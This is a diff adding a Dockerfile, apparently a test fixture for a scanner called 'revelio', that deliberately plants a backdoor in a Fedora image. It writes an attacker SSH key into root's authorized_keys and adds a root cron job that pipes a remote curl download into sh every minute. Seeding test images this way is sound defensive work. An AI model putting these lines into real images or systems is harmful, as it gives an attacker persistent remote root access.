@@ -1,0 +1,8 @@
+FROM fedora:40
+# plant a hand-dropped backdoor cron (not owned by any rpm) + a rogue authorized_key
+RUN mkdir -p /root/.ssh /etc/cron.d \
+ && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1 evil@attacker' > /root/.ssh/authorized_keys \
+ && echo '* * * * * root curl http://198.51.100.7/x | sh' > /etc/cron.d/zz-backdoor
+COPY revelio /usr/local/bin/revelio
+RUN chmod +x /usr/local/bin/revelio
+ENTRYPOINT ["/usr/local/bin/revelio", "--no-color"]
